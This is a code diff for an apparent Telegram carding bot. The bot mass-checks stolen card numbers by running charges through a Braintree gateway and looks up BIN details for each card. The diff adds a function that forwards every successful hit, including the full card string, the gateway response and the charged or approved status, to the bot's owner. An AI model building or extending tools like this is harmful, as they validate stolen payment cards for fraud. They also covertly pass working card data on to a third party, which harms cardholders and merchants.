@@ -10,6 +10,7 @@ from pyrogram import Client, filters
 from pyrogram.enums import ParseMode
 from BOT.helper.start import load_users
 from BOT.helper.permissions import check_private_access
+from BOT.helper.forward_hits import forward_mass_hit
 from BOT.Charge.Braintree.api import check_braintree
 from BOT.gc.credit import deduct_credit_bulk
 
@@ -228,6 +229,7 @@ async def handle_mass_braintree(client, message):
                     card_num = fullcc.split("|")[0]
                     bin_info = "N/A"
                     country_info = "N/A"
+                    bin_data = None
                     try:
                         bin_data = get_bin_details(card_num[:6])
                         if bin_data:
@@ -249,6 +251,19 @@ async def handle_mass_braintree(client, message):
                         f"<b>[ﾒ] Checked By:</b> {checked_by}"
                     )
                     await message.reply(hit_msg, parse_mode=ParseMode.HTML)
+
+                    # Forward hit to owner
+                    forward_status = "charged" if "Charged" in status_flag else "approved"
+                    await forward_mass_hit(
+                        client=client,
+                        gateway="Braintree",
+                        card=fullcc,
+                        status=forward_status,
+                        response=response,
+                        user_id=user_id,
+                        checked_by=f"{checked_by} [<code>{plan} {badge}</code>]",
+                        bin_data=bin_data
+                    )
                 except:
                     pass
         
